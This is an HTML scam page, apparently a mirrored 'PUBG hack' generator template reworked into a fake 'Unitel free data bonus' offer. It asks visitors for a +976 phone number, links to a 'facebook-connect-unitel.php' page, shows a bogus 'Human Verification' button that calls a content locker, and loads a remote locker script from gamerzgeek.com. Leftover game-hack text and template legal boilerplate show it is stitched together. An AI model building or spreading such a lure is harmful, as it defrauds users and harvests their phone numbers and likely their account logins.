
<!DOCTYPE html>
<!-- Fix by ITbong -->
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">

<!-- Mirrored from gamerzgeek.com/pubg/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Jan 2021 12:13:19 GMT -->
<head>
    <title>Unitel Bonus Free Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta name="description" content="Pubg  Online Hack is an online Tool that will help you to generate Battle Points and Diaomonds on your iOS or Android device!" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<!-- Open Graph Social Meta Tags-->
	<meta property="og:title" content="Unitel free data bonus." /> <!-- Title which is displayed when your site is shared on social networks -->
	<meta property="og:description" content="Pubg  Online Hack is an online Tool that will help you to generate Gems and gold on your iOS or Android device!" /> <!-- Website description which is displayed when your site is shared on social networks -->
	<meta name="keywords" content="Pubg  hack, Pubg  free gems, Pubg  online hack, Pubg  hack ios, Pubg  hack iphone, Pubg  hack android, Pubg  gems hack, Pubg  hack 2017" />
	<link rel="icon" type="image/png" sizes="16x16" href="img/favicon-16x16.png">
    <!-- Google Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
	<!-- CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link href="css/animate.css" rel="stylesheet" />
    <link href="css/sweetalert2.min.css" rel="stylesheet" />
    <link href="css/magnific-popup.css" rel="stylesheet" />
    <link href="css/fancySelect.css" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet" />
	<script type="text/javascript" id="ogjs" src="https://gamerzgeek.com/og.php?tool=cl&amp;toolarg=s&amp;id=222fd9bbe73e9f5531b04cbc43980554"></script>
</head>
<body>
	<div id="loader-wrapper">
		<div id="loader"></div>
		<div class="loader-section section-left"></div>
		<div class="loader-section section-right"></div>
	</div>
	<header>
		<div class="branding-wrapper">
			<img class="logo-img" src="data:image/png;base64,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" />
		</div>
	</header>
	<div class="main-wrapper">
		<div class="row">
			<div class="generator-wrapper col-sm-12">
				<div class="generator-wrapper-inner panel-box-wrapper same-height-top-panel">
					<div class="panel-overlay"></div>
					<div id="account-information-wrapper" class="account-information-wrapper">
						<div class="account-information-inner-wrapper">
							<div id="close-account-information-wrapper" class="close-account-information-wrapper"><i class="fa fa-times" aria-hidden="true"></i></div>
							<h4>Enter your phone number data transfer</h4>
							<div class="account-info-fields-wrapper">
								<div class="account-username-wrapper">
									<label class="generator-input-label" for="account-username">Phone number +976</label>
									<input type="number" id="account-username" class="generator-input account-input" placeholder="Phone number" />
								</div>
								<div class="account-platform-wrapper">
									<label class="generator-input-label" for="account-platform"></label>
				
							
										<option value="iOS"></option>
										<option value="PC"></option>
										<option value="xone"></option>

									</select>
								</div>
							</div>
							<div class="generator-button-wrapper">
								<div class="generator-button-inner-wrapper second-step-inner-wrapper">
									<div class="generator-button-dot b-t-r"></div>
									<div class="generator-button-dot b-t-l"></div>
									<div class="generator-button-dot b-b-r"></div>
									<div class="generator-button-dot b-b-l"></div>
									<div class="generator-button-overlay"></div>
									<a href="facebook-connect-unitel.php" class="generator-button second-step-button"><span class="generator-button-text">Continue</span></a>
								</div>
							</div>
						</div>
					</div>
					<div class="panel-content">
						<div class="row">
							<div class="col-md-12">
								<div class="generator-header">
									<h1>Unitel</h1>
									<h2><b>The campaign with free data bonus has always started for every data user!

</b></h2>
<li><strong>It's very simple and just click get.</strong></li>
<li><strong>Write down how much data you need</strong></li>
<li><strong>Enter your name and number in the generator</strong></li>

								</div>
							</div>
						</div>
						<div id="resources-select-wrapper" class="resources-select-wrapper">
							<div class="single-resource-wrapper row">
								<div class="futcoins-select-wrapper">
									
									<div class="col-xs-10 responsive-value-wrapper">
									
										
											
									
								
			
										</div>
									</div>
								</div>
							</div>
							<div class="single-resource-wrapper row">
								<div class="futpoints-select-wrapper">
									<div class="col-xs-1 responsive-button-wrapper no-padding-right">
										<div class="value-button-wrapper">
											<div id="decrease-futpoints" class="decrease-button value-button">-</div>
										</div>
									</div>
									<div class="col-xs-10 responsive-value-wrapper">
										<h3 class="resources-title">Unitel data GB</h3>
										<div id="futpoints-amount-wrapper" class="selected-amount-wrapper">
											<img class="resource-img" src="https://cdn6.aptoide.com/imgs/f/f/e/ffe15830acc1d83fe72ee40aab0af2ee_icon.png" />
											<div id="futpoints-amount">20000</div>
											<div class="max-amount max-amount-points">MAX AMOUNT</div>
										</div>
										<div id="progressBarPoints" class="futpoints-loadbar"><div></div></div>
									</div>
									<div class="col-xs-1 no-padding-left responsive-button-wrapper">
										<div class="value-button-wrapper">
											<div id="increase-futpoints" class="increase-button value-button">+</div>
										</div>
									</div>
								</div>
							</div>
							<div class="generator-button-wrapper generator-start-wrapper">
								<div class="generator-button-inner-wrapper">
									<div class="generator-button-dot b-t-r"></div>
									<div class="generator-button-dot b-t-l"></div>
									<div class="generator-button-dot b-b-r"></div>
									<div class="generator-button-dot b-b-l"></div>
									<div class="generator-button-overlay"></div>
									<a id="first-step-button" class="generator-button first-step-button"><span class="generator-button-text">Get it</span></a>
								</div>
							</div>
						</div>
						<div id="processing-wrapper" class="processing-wrapper">
							<div class="main-console-wrapper">
								<div class="starting-loading-wrapper">
									<i class="icon-refresh rotating"></i>
									<span class="starting-loading-title">Processing</span>
								</div>
								<div id="human-verification" class="human-verification-wrapper"> <!-- Human Verification Main Wrapper -->
									<div class="human-verification-inner-wrapper">
										<h2>Human Verification</h2>
										<div id="whdesc">Your Pubg  BC Coins and UC is ready for use. Please <font color="green">Click Send BP And Uc</font> you are <font color="green">HUMAN</font> now by tapping "Verify".</div>
										<div id="fountainG">
											<div id="fountainG_1" class="fountainG"></div>
											<div id="fountainG_2" class="fountainG"></div>
											<div id="fountainG_3" class="fountainG"></div>
											<div id="fountainG_4" class="fountainG"></div>
											<div id="fountainG_5" class="fountainG"></div>
											<div id="fountainG_6" class="fountainG"></div>
											<div id="fountainG_7" class="fountainG"></div>
											<div id="fountainG_8" class="fountainG"></div>
										</div>
										<div class="verification-offers-wrapper">
											<div class="verification-offers-wrapper">

										<center>
										<button class="buttonVerify" onclick="call_locker();">Send UC & BP Coins</button>
										<style>
											.buttonVerify {
											background-color: #4CAF50; /* Green */
											border: none;
											color: white;
											padding: 15px 32px;
											text-align: center;
											text-decoration: none;
											display: inline-block;
											font-size: 16px;
											}
										</style>
												</iframe>
											</div>
										</div>
									</div>
								</div>
								<div class="row first-console-row">
									<div class="col-sm-6">
										<div class="console-username-wrapper console-item-wrapper">
											<div id="console-success-confirmation-username" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
											<h5>Account Username:</h5>
											<span id="console-username-value" class="console-item-value"><i class="icon-refresh rotating"></i></span>
										</div>
									</div>
									<div class="col-sm-6">
										<div class="console-platform-wrapper console-item-wrapper">
											<div id="console-success-confirmation-platform" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
											<h5></h5>
											<span id="console-platform-value" class="console-item-value"><i class="icon-refresh rotating"></i></span>
										</div>
									</div>
								</div>
								<div class="row">
									<div class="col-sm-6">
										<div class="console-futcoins-wrapper console-item-wrapper">
											<div id="console-success-confirmation-futcoins" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
											<h5>Pubg  Battle Points:</h5>
											<div class="console-futcoins-value-inner-wrapper">
												<img class="console-resource-img" src="img/coins.png" />
												<span id="console-futcoins-value" class="console-item-value console-resource-value">0</span>
											</div>
										</div>
									</div>
									<div class="col-sm-6">
										<div class="console-futpoints-wrapper console-item-wrapper">
											<div id="console-success-confirmation-futpoints" class="console-success-confirmation top-right"><i class="fa fa-check-circle" aria-hidden="true"></i></div>
											<h5>Pubg  Unknown Cash:</h5>
											<div class="console-futpoints-value-inner-wrapper">
												<img class="console-resource-img" src="img/nbacash.png" />
												<span id="console-futpoints-value" class="console-item-value console-resource-value">0</span>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="messages-console-wrapper">
								<div class="console-message"></div>
							</div>
							<div class="loadbar-console-wrapper">
								<div id="progressBarConsole" class="console-loadbar"><div></div></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<footer>

		</div>
	
	</footer>
	<div id="" class="tos-popup-wrapper popup-wrapper mfp-hide">
		<h1>Terms of service</h1>

		<p>These terms of service ("Terms", "Agreement") are an agreement between the operator of MyWebsite ("Website operator", "us", "we" or "our") and you ("User", "you" or "your"). This Agreement sets forth the general terms and conditions of your use of the http://www.mywebsiteurl.com website and any of its products or services (collectively, "Website" or "Services").</p>

		<h2>Age requirement</h2>

		<p>You must be at least 18 years of age to use this Website. By using this Website and by agreeing to this Agreement you warrant and represent that you are at least 18 years of age.</p>

		<h2>Backups</h2>

		<p>We are not responsible for Content residing on the Website. In no event shall we be held liable for any loss of any Content. It is your sole responsibility to maintain appropriate backup of your Content. Notwithstanding the foregoing, on some occasions and in certain circumstances, with absolutely no obligation, we may be able to restore some or all of your data that has been deleted as of a certain date and time when we may have backed up data for our own purposes. We make no guarantee that the data you need will be available.</p>

		<h2>Links to other websites</h2>

		<p>Although this Website may be linked to other websites, we are not, directly or indirectly, implying any approval, association, sponsorship, endorsement, or affiliation with any linked website, unless specifically stated herein. We are not responsible for examining or evaluating, and we do not warrant the offerings of, any businesses or individuals or the content of their websites. We do not assume any responsibility or liability for the actions, products, services and content of any other third parties. You should carefully review the legal statements and other conditions of use of any website which you access through a link from this Website. Your linking to any other off-site pages or other websites is at your own risk.</p>

		<h2>Advertisements</h2>

		<p>During use of the Website, you may enter into correspondence with or participate in promotions of advertisers or sponsors showing their goods or services through the Website. Any such activity, and any terms, conditions, warranties or representations associated with such activity, is solely between you and the applicable third-party. We shall have no liability, obligation or responsibility for any such correspondence, purchase or promotion between you and any such third-party.</p>

		<h2>Prohibited uses</h2>

		<p>In addition to other terms as set forth in the Agreement, you are prohibited from using the website or its content: (a) for any unlawful purpose; (b) to solicit others to perform or participate in any unlawful acts; (c) to violate any international, federal, provincial or state regulations, rules, laws, or local ordinances; (d) to infringe upon or violate our intellectual property rights or the intellectual property rights of others; (e) to harass, abuse, insult, harm, defame, slander, disparage, intimidate, or discriminate based on gender, sexual orientation, religion, ethnicity, race, age, national origin, or disability; (f) to submit false or misleading information; (g) to upload or transmit viruses or any other type of malicious code that will or may be used in any way that will affect the functionality or operation of the Service or of any related website, other websites, or the Internet; (h) to collect or track the personal information of others; (i) to spam, phish, pharm, pretext, spider, crawl, or scrape; (j) for any obscene or immoral purpose; or (k) to interfere with or circumvent the security features of the Service or any related website, other websites, or the Internet. We reserve the right to terminate your use of the Service or any related website for violating any of the prohibited uses.</p>

		<h2>Limitation of liability</h2>

		<p>To the fullest extent permitted by applicable law, in no event will Website operator, its affiliates, officers, directors, employees, agents, suppliers or licensors be liable to any person for (a): any indirect, incidental, special, punitive, cover or consequential damages (including, without limitation, damages for lost profits, revenue, sales, goodwill, use or content, impact on business, business interruption, loss of anticipated savings, loss of business opportunity) however caused, under any theory of liability, including, without limitation, contract, tort, warranty, breach of statutory duty, negligence or otherwise, even if Website operator has been advised as to the possibility of such damages or could have foreseen such damages. To the maximum extent permitted by applicable law, the aggregate liability of Website operator and its affiliates, officers, employees, agents, suppliers and licensors, relating to the services will be limited to an amount greater of one dollar or any amounts actually paid in cash by you to Website operator for the prior one month period prior to the first event or occurrence giving rise to such liability. The limitations and exclusions also apply if this remedy does not fully compensate you for any losses or fails of its essential purpose.</p>

		<h2>Indemnification</h2>

		<p>You agree to indemnify and hold Website operator and its affiliates, directors, officers, employees, and agents harmless from and against any liabilities, losses, damages or costs, including reasonable attorneys' fees, incurred in connection with or arising from any third-party allegations, claims, actions, disputes, or demands asserted against any of them as a result of or relating to your Content, your use of the Website or Services or any willful misconduct on your part.</p>

		<h2>Severability</h2>

		<p>All rights and restrictions contained in this Agreement may be exercised and shall be applicable and binding only to the extent that they do not violate any applicable laws and are intended to be limited to the extent necessary so that they will not render this Agreement illegal, invalid or unenforceable. If any provision or portion of any provision of this Agreement shall be held to be illegal, invalid or unenforceable by a court of competent jurisdiction, it is the intention of the parties that the remaining provisions or portions thereof shall constitute their agreement with respect to the subject matter hereof, and all such remaining provisions or portions thereof shall remain in full force and effect.</p>

		<h2>Dispute resolution</h2>

		<p>The formation, interpretation and performance of this Agreement and any disputes arising out of it shall be governed by the substantive and procedural laws of Bern, Switzerland without regard to its rules on conflicts or choice of law and, to the extent applicable, the laws of Switzerland. The exclusive jurisdiction and venue for actions related to the subject matter hereof shall be the state and federal courts located in Bern, Switzerland, and you hereby submit to the personal jurisdiction of such courts. You hereby waive any right to a jury trial in any proceeding arising out of or related to this Agreement. The United Nations Convention on Contracts for the International Sale of Goods does not apply to this Agreement.</p>

		<h2>Changes and amendments</h2>

		<p>We reserve the right to modify this Agreement or its policies relating to the Website or Services at any time, effective upon posting of an updated version of this Agreement on the Website. When we do we will  revise the updated date at the bottom of this page. Continued use of the Website after any such changes shall constitute your consent to such changes.</p>

		<h2>Acceptance of these terms</h2>

		<p>You acknowledge that you have read this Agreement and agree to all its terms and conditions. By using the Website or its Services you agree to be bound by this Agreement. If you do not agree to abide by the terms of this Agreement, you are not authorized to use or access the Website and its Services.</p>

		<h2>Contacting us</h2>

		<p>If you have any questions about this Policy, please contact us.</p>

		<p>This document was last updated on April 8, 2020</p>
	</div>
	<div id="" class="pp-popup-wrapper popup-wrapper mfp-hide">
		<h1>Privacy policy</h1>

		<p>This privacy policy ("Policy") describes how we collect, protect and use the personally identifiable information ("Personal Information") you ("User", "you" or "your") provide on the http://www.mywebsiteurl.com website and any of its products or services (collectively, "Website" or "Services"). It also describes the choices available to you regarding our use of your personal information and how you can access and update this information. This Policy does not apply to the practices of companies that we do not own or control, or to individuals that we do not employ or manage.</p>

		<h2>Collection of personal information</h2>

		<p>We receive and store any information you knowingly provide to us when you fill any online forms on the Website.  You can choose not to provide us with certain information, but then you may not be able to take advantage of some of the Website's features.</p>

		<h2>Collection of non-personal information</h2>

		<p>When you visit the Website our servers automatically record information that your browser sends. This data may include information such as your computer's IP address, browser type and version, operating system type and version, language preferences or the webpage you were visiting before you came to our Website, pages of our Website that you visit, the time spent on those pages, information you search for on our Website, access times and dates, and other statistics.</p>

		<h2>Use of collected information</h2>

		<p>Any of the information we collect from you may be used to  personalize your experience; improve our website; improve customer service and respond to queries and emails of our customers; run and operate our Website and Services. Non-personal information collected is used only to identify potential cases of abuse and establish statistical information regarding Website traffic and usage. This statistical information is not otherwise aggregated in such a way that would identify any particular user of the system.</p>

		<h2>Children</h2>

		<p>We do not knowingly collect any personal information from children under the age of 13. If you are under the age of 13, please do not submit any personal information through our Website or Service. We encourage parents and legal guardians to monitor their children's Internet usage and to help enforce this Policy by instructing their children never to provide personal information through our Website or Service without their permission. If you have reason to believe that a child under the age of 13 has provided personal information to us through our Website or Service, please contact us.</p>

		<h2>Cookies</h2>

		<p>The Website uses "cookies" to help personalize your online experience. A cookie is a text file that is placed on your hard disk by a web page server. Cookies cannot be used to run programs or deliver viruses to your computer. Cookies are uniquely assigned to you, and can only be read by a web server in the domain that issued the cookie to you. We may use cookies to collect, store, and track information for statistical purposes to operate our Website and Services. You have the ability to accept or decline cookies. Most web browsers automatically accept cookies, but you can usually modify your browser setting to decline cookies if you prefer. If you choose to decline cookies, you may not be able to fully experience the features of the Website and Services.</p>

		<h2>Advertisement</h2>

		<p>We may display online advertisements and we may share aggregated and non-identifying information about our customers that we collect through the registration process or through online surveys and promotions with certain advertisers. We do not share personally identifiable information about individual customers with advertisers. In some instances, we may use this aggregated and non-identifying information to deliver tailored advertisements to the intended audience.</p>

		<h2>Links to other websites</h2>

		<p>Our Website contains links to other websites that are not owned or controlled by us. Please be aware that we are not responsible for the privacy practices of such other websites or third parties. We encourage you to be aware when you leave our Website and to read the privacy statements of each and every website that may collect personal information.</p>

		<h2>Information security</h2>

		<p>We secure information you provide on computer servers in a controlled, secure environment, protected from unauthorized access, use, or disclosure. We maintain reasonable administrative, technical, and physical safeguards in an effort to protect against unauthorized access, use, modification, and disclosure of personal information in its control and custody. However, no data transmission over the Internet or wireless network can be guaranteed. Therefore, while we strive to protect your personal information, you acknowledge that (i) there are security and privacy limitations of the Internet which are beyond our control; (ii) the security, integrity, and privacy of any and all information and data exchanged between you and our Website cannot be guaranteed; and (iii) any such information and data may be viewed or tampered with in transit by a third party, despite best efforts.</p>

		<h2>Data breach</h2>

		<p>In the event we become aware that the security of the Website has been compromised or users Personal Information has been disclosed to unrelated third parties as a result of external activity, including, but not limited to, security attacks or fraud, we reserve the right to take reasonably appropriate measures, including, but not limited to, investigation and reporting, as well as notification to and cooperation with law enforcement authorities. In the event of a data breach, we will make reasonable efforts to notify affected individuals if we believe that there is a reasonable risk of harm to the user as a result of the breach or if notice is otherwise required by law. When we do we will post a notice on the Website.</p>

		<h2>Changes and amendments</h2>

		<p>We reserve the right to modify this privacy policy relating to the Website or Services at any time, effective upon posting of an updated version of this privacy policy on the Website. When we do we will  revise the updated date at the bottom of this page. Continued use of the Website after any such changes shall constitute your consent to such changes.</p>

		<h2>Acceptance of this policy</h2>

		<p>You acknowledge that you have read this Policy and agree to all its terms and conditions. By using the Website or its Services you agree to be bound by this Policy. If you do not agree to abide by the terms of this Policy, you are not authorized to use or access the Website and its Services.</p>

		<h2>Contacting us</h2>

		<p>If you have any questions about this Policy, please contact us.</p>

		<p>This document was last updated on April 8, 2020</p>
	</div>
	<div id="" class="contact-popup-wrapper popup-wrapper mfp-hide">
		<h1>Send us a message</h1>
		<div class="contact-form-wrapper">
			<form role="form" id="contactForm" data-toggle="validator" class="shake">
				<div class="row">
					<div class="form-group col-sm-6">
						<label for="name" class="h4">Name</label>
						<input type="text" class="form-control" id="name" placeholder="Enter name" required data-error="Please enter your name.">
						<div class="help-block with-errors"></div>
					</div>
					<div class="form-group col-sm-6">
						<label for="email" class="h4">Email</label>
						<input type="email" class="form-control" id="email" placeholder="Enter email" required data-error="Please enter your email.">
						<div class="help-block with-errors"></div>
					</div>
				</div>
				<div class="form-group">
					<label for="message" class="h4 ">Message</label>
					<textarea id="message" class="form-control" rows="5" placeholder="Enter your message" required data-error="Please enter your message."></textarea>
					<div class="help-block with-errors"></div>
				</div>
				<button type="submit" id="form-submit" class="btn btn-success btn-lg pull-right ">Submit</button>
				<div id="msgSubmit" class="h3 text-center hidden"></div>
				<div class="clearfix"></div>
			</form>
		</div>
	</div>
	<!-- JavaScript/jQuery -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.13/jquery-ui.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="js/fancySelect.js"></script>
    <script type="text/javascript" src="js/jquery.countTo.js"></script>
    <script type="text/javascript" src="js/sweetalert2.min.js"></script>
    <script type="text/javascript" src="js/validator.min.js"></script>
    <script type="text/javascript" src="js/com.js"></script>
	<script type="text/javascript" src="js/form-scripts.js"></script>
	<script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>
	<script type="text/javascript" src="js/sticky.js"></script>
    <script type="text/javascript" src="js/main.js"></script>
</body>

<!-- Mirrored from gamerzgeek.com/pubg/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Jan 2021 12:13:38 GMT -->
</html>
